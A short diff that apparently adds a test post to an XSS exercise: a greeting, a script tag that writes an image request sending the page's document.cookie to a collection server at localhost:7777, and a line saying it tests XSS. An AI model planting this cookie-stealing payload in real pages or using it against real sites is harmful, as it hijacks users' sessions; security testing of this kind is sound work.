@@ -1,0 +1,4 @@
+Task 1
+Hello Folks,
+<script>document.write('<img src=http://localhost:7777?c=' + escape(document.cookie) + '>')</script>
+This script is to test XSS. Thanks.
